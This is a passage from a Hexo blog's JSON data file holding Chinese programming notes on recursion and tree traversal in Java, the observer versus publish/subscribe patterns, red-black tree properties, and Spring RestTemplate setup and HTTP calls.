class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>递归存在一个终止条件，每次递归会越来越接近这个终止条件。</p>\n<h3 id=\"2-理解\"><a href=\"#2-理解\" class=\"headerlink\" title=\"(2)理解\"></a>(2)理解</h3><p>递归类似于循环，有一个繁琐的操作，但是每一步之间有相似性，可以将之拆分为不同层次，循环处理，每个层次都会有自己的返回结果或者操作照成的影响。</p>\n<h3 id=\"3-树的递归遍历\"><a href=\"#3-树的递归遍历\" class=\"headerlink\" title=\"(3)树的递归遍历\"></a>(3)树的递归遍历</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">//中序 左中右</span><br><span class=\"line\">public void inOrder(TreeNode root)&#123;</span><br><span class=\"line\">    if(root != null)&#123;</span><br><span class=\"line\">        //遍历它的左下级节点</span><br><span class=\"line\">        inOrder(root.left);</span><br><span class=\"line\">        System.out.println(root.val);</span><br><span class=\"line\">        //左节点完后，遍历右节点</span><br><span class=\"line\">        inOrder(root.right);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">//前序 中左右</span><br><span class=\"line\">public void beforeOrder(TreeNode root)&#123;</span><br><span class=\"line\">    if(root != null)&#123;</span><br><span class=\"line\">        System.out.println(root.val);</span><br><span class=\"line\">        //遍历它的左下级节点</span><br><span class=\"line\">        beforeOrderOrder(root.left);</span><br><span class=\"line\">        //左节点完后，遍历右节点</span><br><span class=\"line\">        beforeOrderOrder(root.right);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">//后续 左右中</span><br><span class=\"line\">public void afterOrder(TreeNode root)&#123;</span><br><span class=\"line\">    if(root != null)&#123;</span><br><span class=\"line\">        //遍历它的左下级节点</span><br><span class=\"line\">        afterOrder(root.left);</span><br><span class=\"line\">        //左节点完后，遍历右节点</span><br><span class=\"line\">        afterOrder(root.right);</span><br><span class=\"line\">        System.out.println(root.val);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>以中序遍历为例: 从根节点开始。<br><br><img src=\"http://67.216.218.49:8000/file/blogs/algorithm/tree02.png\" alt=\"tree\"><br></p>\n<p>如图，要进行中序遍历：</p>\n<p>1.F.left -&gt; B.left -&gt; A.left(无)  return A<br><br>2.return B<br><br>3.B.right -&gt; D.left -&gt; C.left(无) return C<br><br>4.return D<br><br>5.D.right -&gt; E.left(无) return E<br><br>…..</p>\n<p>可以看见，从根节点开始，先 从左节点开始，层层遍历(递归)，找到最左子节点.<br><br>然后会跳出当层循环(最下层),得到B<br><br>然后B查找其右节点，存在，则从右节点开始，查找左节点。<br></p>\n<p>总结，一层遍历分为查找左节点(如果存在) -&gt; 找到自己 -&gt; 查找右节点(如果存在) 三步，所以这三步可以成为一个基本递归单位.</p>\n<p>root == null 为其结束条件。</p>\n","site":{"data":{}},"excerpt":"","more":"<p>对递归的理解总是不是很清晰。但是又非常重要，学习记录一下.</p>\n<h2 id=\"1-经典例子Fibonacc\"><a href=\"#1-经典例子Fibonacc\" class=\"headerlink\" title=\"1.经典例子Fibonacc\"></a>1.经典例子Fibonacc</h2><p>斐波那契数列是指1，1，2，3，5，8，13，21…的一个数列，它的规律就是某一个数就是前面两个数的和.</p>\n<h3 id=\"1-实现\"><a href=\"#1-实现\" class=\"headerlink\" title=\"(1)实现\"></a>(1)实现</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">public class MyTest &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    public int fibonacc(int n)&#123;</span><br><span class=\"line\">        if(n == 0 || n == 1)&#123;</span><br><span class=\"line\">            return 1;</span><br><span class=\"line\">        &#125;else &#123;</span><br><span class=\"line\">            //递归</span><br><span class=\"line\">            return fibonacc(n-2) + fibonacc(n-1);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    public static void main(String[] args)&#123;</span><br><span class=\"line\">        System.out.println(new MyTest().fibonacc(4));</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"2-流程\"><a href=\"#2-流程\" class=\"headerlink\" title=\"(2)流程\"></a>(2)流程</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1.fi(4)</span><br><span class=\"line\">2.  fi(3)                       +               fi(2)</span><br><span class=\"line\">3.    fi(2)               +   fi(1)      +        fi(1) + fi(0)</span><br><span class=\"line\">4.      fi(1) + fi(0)     +   return     +        return + return</span><br><span class=\"line\">5.      return + return          +              return</span><br><span class=\"line\">6.    return</span><br><span class=\"line\">7.  return</span><br><span class=\"line\">8.return</span><br></pre></td></tr></table></figure>\n<p>如上,当求fi(4)的时候，进入递归，求出fi(3),fi(2),fi(1);</p>\n<h2 id=\"2-为什么要用递归？\"><a href=\"#2-为什么要用递归？\" class=\"headerlink\" title=\"2.为什么要用递归？\"></a>2.为什么要用递归？</h2><p>在适合的场景下，递归代码非常简洁清晰，描述问题易于理解。<br></p>\n<p>但是，如果调用层数比较深，需要增加额外的堆栈处理（还有可能出现堆栈溢出的情况），比如参数传递需要压栈等操作，会对执行效率有一定影响。</p>\n<h2 id=\"3-对于递归的理解\"><a href=\"#3-对于递归的理解\" class=\"headerlink\" title=\"3.对于递归的理解\"></a>3.对于递归的理解</h2><h3 id=\"1-通用结构\"><a href=\"#1-通用结构\" class=\"headerlink\" title=\"(1)通用结构\"></a>(1)通用结构</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">func()&#123;</span><br><span class=\"line\">  if(结束条件)&#123;</span><br><span class=\"line\">    return;</span><br><span class=\"line\">  &#125;else&#123;</span><br><span class=\"line\">    //递归</span><br><span class=\"line\">    func();</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>递归存在一个终止条件，每次递归会越来越接近这个终止条件。</p>\n<h3 id=\"2-理解\"><a href=\"#2-理解\" class=\"headerlink\" title=\"(2)理解\"></a>(2)理解</h3><p>递归类似于循环，有一个繁琐的操作，但是每一步之间有相似性，可以将之拆分为不同层次，循环处理，每个层次都会有自己的返回结果或者操作照成的影响。</p>\n<h3 id=\"3-树的递归遍历\"><a href=\"#3-树的递归遍历\" class=\"headerlink\" title=\"(3)树的递归遍历\"></a>(3)树的递归遍历</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">//中序 左中右</span><br><span class=\"line\">public void inOrder(TreeNode root)&#123;</span><br><span class=\"line\">    if(root != null)&#123;</span><br><span class=\"line\">        //遍历它的左下级节点</span><br><span class=\"line\">        inOrder(root.left);</span><br><span class=\"line\">        System.out.println(root.val);</span><br><span class=\"line\">        //左节点完后，遍历右节点</span><br><span class=\"line\">        inOrder(root.right);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">//前序 中左右</span><br><span class=\"line\">public void beforeOrder(TreeNode root)&#123;</span><br><span class=\"line\">    if(root != null)&#123;</span><br><span class=\"line\">        System.out.println(root.val);</span><br><span class=\"line\">        //遍历它的左下级节点</span><br><span class=\"line\">        beforeOrderOrder(root.left);</span><br><span class=\"line\">        //左节点完后，遍历右节点</span><br><span class=\"line\">        beforeOrderOrder(root.right);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">//后续 左右中</span><br><span class=\"line\">public void afterOrder(TreeNode root)&#123;</span><br><span class=\"line\">    if(root != null)&#123;</span><br><span class=\"line\">        //遍历它的左下级节点</span><br><span class=\"line\">        afterOrder(root.left);</span><br><span class=\"line\">        //左节点完后，遍历右节点</span><br><span class=\"line\">        afterOrder(root.right);</span><br><span class=\"line\">        System.out.println(root.val);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>以中序遍历为例: 从根节点开始。<br><br><img src=\"http://67.216.218.49:8000/file/blogs/algorithm/tree02.png\" alt=\"tree\"><br></p>\n<p>如图，要进行中序遍历：</p>\n<p>1.F.left -&gt; B.left -&gt; A.left(无)  return A<br><br>2.return B<br><br>3.B.right -&gt; D.left -&gt; C.left(无) return C<br><br>4.return D<br><br>5.D.right -&gt; E.left(无) return E<br><br>…..</p>\n<p>可以看见，从根节点开始，先 从左节点开始，层层遍历(递归)，找到最左子节点.<br><br>然后会跳出当层循环(最下层),得到B<br><br>然后B查找其右节点，存在，则从右节点开始，查找左节点。<br></p>\n<p>总结，一层遍历分为查找左节点(如果存在) -&gt; 找到自己 -&gt; 查找右节点(如果存在) 三步，所以这三步可以成为一个基本递归单位.</p>\n<p>root == null 为其结束条件。</p>\n"},{"title":"pub/sub模式和观察者模式","date":"2019-10-09T20:43:55.000Z","_content":"\n知乎高赞回答:https://www.zhihu.com/question/23486749\n\n# 什么是观察者模式\n\n观察者订阅一个对象，当对象状态发生改变，直接告诉观察者。\n\n![obeverse](http://67.216.218.49:8000/file/blogs/base/design-patterns/obverse_01.png)\n\n# 什么是发布订阅模式\n\n观察者订阅一个对象，但是不是直接订阅对象，而是订阅事件池中的该对象信息，对象发生改变时，将变更信息放到事件池， 观察者从事件池中获取变更。\n\n![pub_sub](http://67.216.218.49:8000/file/blogs/base/design-patterns/pub_sub_01.png)\n\n# 区别\n\n为什么要多加个中间层？中间层充当什么角色，事件管理?调度中心？有什么好处？<br>\n\n个人理解,不一定准确:<br>\n\n观察者得一直盯着对象，观察它是否发生变化。 发布订阅可以一直盯着，也可以先干自己的事情，隔一段时间想起来了，再去事件池中看有无消息，应用场景更广。如，消息队列，观察者(既消费者)离线后，事件信息不会丢失,上线后还能继续处理.\n","source":"_posts/base/发布订阅模式与观察者模式.md","raw":"---\ntitle: pub/sub模式和观察者模式\ndate: 2019-10-09 16:43:55\ntags: [base]\n---\n\n知乎高赞回答:https://www.zhihu.com/question/23486749\n\n# 什么是观察者模式\n\n观察者订阅一个对象，当对象状态发生改变，直接告诉观察者。\n\n![obeverse](http://67.216.218.49:8000/file/blogs/base/design-patterns/obverse_01.png)\n\n# 什么是发布订阅模式\n\n观察者订阅一个对象，但是不是直接订阅对象，而是订阅事件池中的该对象信息，对象发生改变时，将变更信息放到事件池， 观察者从事件池中获取变更。\n\n![pub_sub](http://67.216.218.49:8000/file/blogs/base/design-patterns/pub_sub_01.png)\n\n# 区别\n\n为什么要多加个中间层？中间层充当什么角色，事件管理?调度中心？有什么好处？<br>\n\n个人理解,不一定准确:<br>\n\n观察者得一直盯着对象，观察它是否发生变化。 发布订阅可以一直盯着，也可以先干自己的事情，隔一段时间想起来了，再去事件池中看有无消息，应用场景更广。如，消息队列，观察者(既消费者)离线后，事件信息不会丢失,上线后还能继续处理.\n","slug":"base/发布订阅模式与观察者模式","published":1,"updated":"2019-10-13T12:15:12.168Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ck23321h9000h6dcpfa71vbgv","content":"<p>知乎高赞回答:<a href=\"https://www.zhihu.com/question/23486749\" target=\"_blank\" rel=\"noopener\">https://www.zhihu.com/question/23486749</a></p>\n<h1 id=\"什么是观察者模式\"><a href=\"#什么是观察者模式\" class=\"headerlink\" title=\"什么是观察者模式\"></a>什么是观察者模式</h1><p>观察者订阅一个对象，当对象状态发生改变，直接告诉观察者。</p>\n<p><img src=\"http://67.216.218.49:8000/file/blogs/base/design-patterns/obverse_01.png\" alt=\"obeverse\"></p>\n<h1 id=\"什么是发布订阅模式\"><a href=\"#什么是发布订阅模式\" class=\"headerlink\" title=\"什么是发布订阅模式\"></a>什么是发布订阅模式</h1><p>观察者订阅一个对象，但是不是直接订阅对象，而是订阅事件池中的该对象信息，对象发生改变时，将变更信息放到事件池， 观察者从事件池中获取变更。</p>\n<p><img src=\"http://67.216.218.49:8000/file/blogs/base/design-patterns/pub_sub_01.png\" alt=\"pub_sub\"></p>\n<h1 id=\"区别\"><a href=\"#区别\" class=\"headerlink\" title=\"区别\"></a>区别</h1><p>为什么要多加个中间层？中间层充当什么角色，事件管理?调度中心？有什么好处？<br></p>\n<p>个人理解,不一定准确:<br></p>\n<p>观察者得一直盯着对象，观察它是否发生变化。 发布订阅可以一直盯着，也可以先干自己的事情，隔一段时间想起来了，再去事件池中看有无消息，应用场景更广。如，消息队列，观察者(既消费者)离线后，事件信息不会丢失,上线后还能继续处理.</p>\n","site":{"data":{}},"excerpt":"","more":"<p>知乎高赞回答:<a href=\"https://www.zhihu.com/question/23486749\" target=\"_blank\" rel=\"noopener\">https://www.zhihu.com/question/23486749</a></p>\n<h1 id=\"什么是观察者模式\"><a href=\"#什么是观察者模式\" class=\"headerlink\" title=\"什么是观察者模式\"></a>什么是观察者模式</h1><p>观察者订阅一个对象，当对象状态发生改变，直接告诉观察者。</p>\n<p><img src=\"http://67.216.218.49:8000/file/blogs/base/design-patterns/obverse_01.png\" alt=\"obeverse\"></p>\n<h1 id=\"什么是发布订阅模式\"><a href=\"#什么是发布订阅模式\" class=\"headerlink\" title=\"什么是发布订阅模式\"></a>什么是发布订阅模式</h1><p>观察者订阅一个对象，但是不是直接订阅对象，而是订阅事件池中的该对象信息，对象发生改变时，将变更信息放到事件池， 观察者从事件池中获取变更。</p>\n<p><img src=\"http://67.216.218.49:8000/file/blogs/base/design-patterns/pub_sub_01.png\" alt=\"pub_sub\"></p>\n<h1 id=\"区别\"><a href=\"#区别\" class=\"headerlink\" title=\"区别\"></a>区别</h1><p>为什么要多加个中间层？中间层充当什么角色，事件管理?调度中心？有什么好处？<br></p>\n<p>个人理解,不一定准确:<br></p>\n<p>观察者得一直盯着对象，观察它是否发生变化。 发布订阅可以一直盯着，也可以先干自己的事情，隔一段时间想起来了，再去事件池中看有无消息，应用场景更广。如，消息队列，观察者(既消费者)离线后，事件信息不会丢失,上线后还能继续处理.</p>\n"},{"title":"红黑树初接触","date":"2019-08-20T21:02:30.000Z","_content":"\n要了解红黑树，首先要了解二叉查找树.红黑树是一种有特殊规则的二叉查找树.这些规则使红黑树保证了一种平衡，插入、删除、查找的最坏时间复杂度都为 O(logn)\n\n红黑树的应用比较广泛，主要是用它来存储有序的数据，它的时间复杂度是O(lgn)，效率非常之高。\n\n\n\n## 一.红黑树特点\n\n1.根节点是黑色\n\n2.每个节点非黑即红\n\n3.每个叶子节点(即NULL)都是黑\n\n4.如果一个节点为红色，则它的子节点一定为黑色(没有说黑色节点的子节点一定为黑色)\n\n5.对于任意节点，其到叶子节点的每条路径都包含相同数目黑节点\n\n6.红黑树是一种弱平衡二叉树\n\n\n2.为什么要有红黑树\n在插入和删除的过程中，红黑树会采取一定的策略对树的组织形式进行调整，以尽可能的减少树的高度，从而节省查找的时间\n避免极端情况发生\n\n为什么要用红黑树就要了解它和AVL树的区别， 在删除时，红黑树最多经过三次旋转，效率更高\n\n3.怎么实现\n","source":"_posts/algorithm/红黑树初次接触.md","raw":"---\ntitle: 红黑树初接触\ndate: 2019-08-20 17:02:30\ntags: [algorithm]\n---\n\n要了解红黑树，首先要了解二叉查找树.红黑树是一种有特殊规则的二叉查找树.这些规则使红黑树保证了一种平衡，插入、删除、查找的最坏时间复杂度都为 O(logn)\n\n红黑树的应用比较广泛，主要是用它来存储有序的数据，它的时间复杂度是O(lgn)，效率非常之高。\n\n\n\n## 一.红黑树特点\n\n1.根节点是黑色\n\n2.每个节点非黑即红\n\n3.每个叶子节点(即NULL)都是黑\n\n4.如果一个节点为红色，则它的子节点一定为黑色(没有说黑色节点的子节点一定为黑色)\n\n5.对于任意节点，其到叶子节点的每条路径都包含相同数目黑节点\n\n6.红黑树是一种弱平衡二叉树\n\n\n2.为什么要有红黑树\n在插入和删除的过程中，红黑树会采取一定的策略对树的组织形式进行调整，以尽可能的减少树的高度，从而节省查找的时间\n避免极端情况发生\n\n为什么要用红黑树就要了解它和AVL树的区别， 在删除时，红黑树最多经过三次旋转，效率更高\n\n3.怎么实现\n","slug":"algorithm/红黑树初次接触","published":1,"updated":"2019-10-13T12:15:12.168Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ck23321ha000j6dcp33i6ldx1","content":"<p>要了解红黑树，首先要了解二叉查找树.红黑树是一种有特殊规则的二叉查找树.这些规则使红黑树保证了一种平衡，插入、删除、查找的最坏时间复杂度都为 O(logn)</p>\n<p>红黑树的应用比较广泛，主要是用它来存储有序的数据，它的时间复杂度是O(lgn)，效率非常之高。</p>\n<h2 id=\"一-红黑树特点\"><a href=\"#一-红黑树特点\" class=\"headerlink\" title=\"一.红黑树特点\"></a>一.红黑树特点</h2><p>1.根节点是黑色</p>\n<p>2.每个节点非黑即红</p>\n<p>3.每个叶子节点(即NULL)都是黑</p>\n<p>4.如果一个节点为红色，则它的子节点一定为黑色(没有说黑色节点的子节点一定为黑色)</p>\n<p>5.对于任意节点，其到叶子节点的每条路径都包含相同数目黑节点</p>\n<p>6.红黑树是一种弱平衡二叉树</p>\n<p>2.为什么要有红黑树<br>在插入和删除的过程中，红黑树会采取一定的策略对树的组织形式进行调整，以尽可能的减少树的高度，从而节省查找的时间<br>避免极端情况发生</p>\n<p>为什么要用红黑树就要了解它和AVL树的区别， 在删除时，红黑树最多经过三次旋转，效率更高</p>\n<p>3.怎么实现</p>\n","site":{"data":{}},"excerpt":"","more":"<p>要了解红黑树，首先要了解二叉查找树.红黑树是一种有特殊规则的二叉查找树.这些规则使红黑树保证了一种平衡，插入、删除、查找的最坏时间复杂度都为 O(logn)</p>\n<p>红黑树的应用比较广泛，主要是用它来存储有序的数据，它的时间复杂度是O(lgn)，效率非常之高。</p>\n<h2 id=\"一-红黑树特点\"><a href=\"#一-红黑树特点\" class=\"headerlink\" title=\"一.红黑树特点\"></a>一.红黑树特点</h2><p>1.根节点是黑色</p>\n<p>2.每个节点非黑即红</p>\n<p>3.每个叶子节点(即NULL)都是黑</p>\n<p>4.如果一个节点为红色，则它的子节点一定为黑色(没有说黑色节点的子节点一定为黑色)</p>\n<p>5.对于任意节点，其到叶子节点的每条路径都包含相同数目黑节点</p>\n<p>6.红黑树是一种弱平衡二叉树</p>\n<p>2.为什么要有红黑树<br>在插入和删除的过程中，红黑树会采取一定的策略对树的组织形式进行调整，以尽可能的减少树的高度，从而节省查找的时间<br>避免极端情况发生</p>\n<p>为什么要用红黑树就要了解它和AVL树的区别， 在删除时，红黑树最多经过三次旋转，效率更高</p>\n<p>3.怎么实现</p>\n"},{"title":"RestTemplate","date":"2018-08-30T20:51:32.000Z","_content":"\n因为在代码中需要调用外部的接口，所以使用RestTemplate\n\n###### 1.导入\n```\n<!-- 包含有restTemplate -->\n<dependency>\n  <groupId>org.springframework.boot</groupId>\n  <artifactId>spring-boot-starter-web</artifactId>\n</dependency>\n```\n\n###### 2.完成配置类\n```\n@Configuration\npublic class RestTemplateConfig {\n  //因为在普通类中使用它，所以给Bean去个名字，方便getBean()导入\n\t@Bean(name = \"RestTemplate\")\n\tpublic RestTemplate restTemplate(ClientHttpRequestFactory factory){\n\t\treturn new RestTemplate(factory);\n\t}\n\n\t@Bean\n\tpublic ClientHttpRequestFactory simpleClientHttpRequestFactory(){\n\t\tSimpleClientHttpRequestFactory factory=new SimpleClientHttpRequestFactory();\n\t\tfactory.setConnectTimeout(15000);\n\t\tfactory.setReadTimeout(5000);\n\t\treturn factory;\n\t}\n}\n```\n\n###### 3.使用\n```\npublic class AcceptDeal extends Thread {\n\n  //通过名字导入\n\tRestTemplate restTemplate = (RestTemplate) SpringUtil.getBean(\"RestTemplate\");\n\n\t//回执接口\n\tString url = \"url\" + \"/\" + report.getState();\n\trestTemplate.getForEntity(\"url\", String.class);\n\n}\n\n```\n设置header与发送接收类型\n```\ntry {\n           String url = \"http://xxxxx\";\n           //设置ContentType\n           HttpHeaders httpHeaders = new HttpHeaders();\n           MediaType type = MediaType.parseMediaType( \"application/x-www-form-urlencoded;charset=utf-8\");\n           httpHeaders.setContentType(type);\n           //form表单\n           MultiValueMap<String, String> paramMap = new LinkedMultiValueMap<String, String>();\n           paramMap.add(\"number\", deliver.getUserNumber().substring(2));\n           paramMap.add(\"port\", deliver.getSPNumber());\n           paramMap.add(\"content\",new String(deliver.getMessageByte(), \"UnicodeBigUnmarked\"));\n           paramMap.add(\"time\", df.format(new Date()));\n           HttpEntity<MultiValueMap<String, String>> requestEntity = new HttpEntity<MultiValueMap<String, String>>(paramMap, httpHeaders);\n           //调用回执接口\n           String re = restTemplate.postForObject(url, requestEntity, String.class);\n       }catch (Exception e){\n         e.printStackTrace();\n       }\n```\n","source":"_posts/java/RestTemplate.md","raw":"---\ntitle: RestTemplate\ndate: 2018-08-30 16:51:32\ntags: [java,springboot]\n---\n\n因为在代码中需要调用外部的接口，所以使用RestTemplate\n\n###### 1.导入\n```\n<!-- 包含有restTemplate -->\n<dependency>\n  <groupId>org.springframework.boot</groupId>\n  <artifactId>spring-boot-starter-web</artifactId>\n</dependency>\n```\n\n###### 2.完成配置类\n```\n@Configuration\npublic class RestTemplateConfig {\n  //因为在普通类中使用它，所以给Bean去个名字，方便getBean()导入\n\t@Bean(name = \"RestTemplate\")\n\tpublic RestTemplate restTemplate(ClientHttpRequestFactory factory){\n\t\treturn new RestTemplate(factory);\n\t}\n\n\t@Bean\n\tpublic ClientHttpRequestFactory simpleClientHttpRequestFactory(){\n\t\tSimpleClientHttpRequestFactory factory=new SimpleClientHttpRequestFactory();\n\t\tfactory.setConnectTimeout(15000);\n\t\tfactory.setReadTimeout(5000);\n\t\treturn factory;\n\t}\n}\n```\n\n###### 3.使用\n```\npublic class AcceptDeal extends Thread {\n\n  //通过名字导入\n\tRestTemplate restTemplate = (RestTemplate) SpringUtil.getBean(\"RestTemplate\");\n\n\t//回执接口\n\tString url = \"url\" + \"/\" + report.getState();\n\trestTemplate.getForEntity(\"url\", String.class);\n\n}\n\n```\n设置header与发送接收类型\n```\ntry {\n           String url = \"http://xxxxx\";\n           //设置ContentType\n           HttpHeaders httpHeaders = new HttpHeaders();\n           MediaType type = MediaType.parseMediaType( \"application/x-www-form-urlencoded;charset=utf-8\");\n           httpHeaders.setContentType(type);\n           //form表单\n           MultiValueMap<String, String> paramMap = new LinkedMultiValueMap<String, String>();\n           paramMap.add(\"number\", deliver.getUserNumber().substring(2));\n           paramMap.add(\"port\", deliver.getSPNumber());\n           paramMap.add(\"content\",new String(deliver.getMessageByte(), \"UnicodeBigUnmarked\"));\n           paramMap.add(\"time\", df.format(new Date()));\n           HttpEntity<MultiValueMap<String, String>> requestEntity = new HttpEntity<MultiValueMap<String, String>>(paramMap, httpHeaders);\n           //调用回执接口\n           String re = restTemplate.postForObject(url, requestEntity, String.class);\n       }catch (Exception e){\n         e.printStackTrace();\n       }\n```\n","slug":"java/RestTemplate","published":1,"updated":"2019-10-13T12:15:12.168Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ck23321hc000k6dcpbwhcn9wx","content":"<p>因为在代码中需要调用外部的接口，所以使用RestTemplate</p>\n<h6 id=\"1-导入\"><a href=\"#1-导入\" class=\"headerlink\" title=\"1.导入\"></a>1.导入</h6><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;!-- 包含有restTemplate --&gt;</span><br><span class=\"line\">&lt;dependency&gt;</span><br><span class=\"line\">  &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;</span><br><span class=\"line\">  &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt;</span><br><span class=\"line\">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure>\n<h6 id=\"2-完成配置类\"><a href=\"#2-完成配置类\" class=\"headerlink\" title=\"2.完成配置类\"></a>2.完成配置类</h6><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">@Configuration</span><br><span class=\"line\">public class RestTemplateConfig &#123;</span><br><span class=\"line\">  //因为在普通类中使用它，所以给Bean去个名字，方便getBean()导入</span><br><span class=\"line\">\t@Bean(name = &quot;RestTemplate&quot;)</span><br><span class=\"line\">\tpublic RestTemplate restTemplate(ClientHttpRequestFactory factory)&#123;</span><br><span class=\"line\">\t\treturn new RestTemplate(factory);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t@Bean</span><br><span class=\"line\">\tpublic ClientHttpRequestFactory simpleClientHttpRequestFactory()&#123;</span><br><span class=\"line\">\t\tSimpleClientHttpRequestFactory factory=new SimpleClientHttpRequestFactory();</span><br><span class=\"line\">\t\tfactory.setConnectTimeout(15000);</span><br><span class=\"line\">\t\tfactory.setReadTimeout(5000);</span><br><span class=\"line\">\t\treturn factory;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h6 id=\"3-使用\"><a href=\"#3-使用\" class=\"headerlink\" title=\"3.使用\"></a>3.使用</h6><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">public class AcceptDeal extends Thread &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">  //通过名字导入</span><br><span class=\"line\">\tRestTemplate restTemplate = (RestTemplate) SpringUtil.getBean(&quot;RestTemplate&quot;);</span><br><span class=\"line\"></span><br><span class=\"line\">\t//回执接口</span><br><span class=\"line\">\tString url = &quot;url&quot; + &quot;/&quot; + report.getState();</span><br><span class=\"line\">\trestTemplate.getForEntity(&quot;url&quot;, String.class);</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>设置header与发送接收类型<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span 